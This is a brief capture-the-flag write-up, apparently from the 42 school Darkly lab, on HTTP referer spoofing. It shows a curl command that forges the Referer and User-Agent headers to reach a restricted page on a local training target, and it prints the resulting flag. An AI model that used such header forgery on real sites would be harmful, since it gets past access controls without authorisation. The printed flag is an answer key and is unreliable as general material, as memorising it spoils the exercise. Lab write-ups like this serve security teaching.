# HTTP referer spoofing
Concerns sending incorrect referer information in an HTTP request in order to prevent a website from obtaining accurate data on the identity of the web page previously visited by the user and furthermore, may allow the user to access pages whilsted being unautherised.

### Step 1
Navigate to http://0.0.0.0/?page=e43ad1fdc54babe674da7c7b8f0127bde61de3fbe01def7d00f151c2fcca6d1c
> * Inspect, look at page and comments
> * Filter through the 42 info to find: _you must be coming from https://www.nsa.gov/_ and _use the ft_bornToSec browser_

### Step 2
> * Attack: Use cURL to modify the Referer and User-agent section within the header
> 1. curl -H "User-Agent: ft_bornToSec" --referer https://www.nsa.gov/ http://0.0.0.0/?page=e43ad1fdc54babe674da7c7b8f0127bde61de3fbe01def7d00f151c2fcca6d1c |
 grep "flag"
> 2. **THE FLAG IS : f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188**

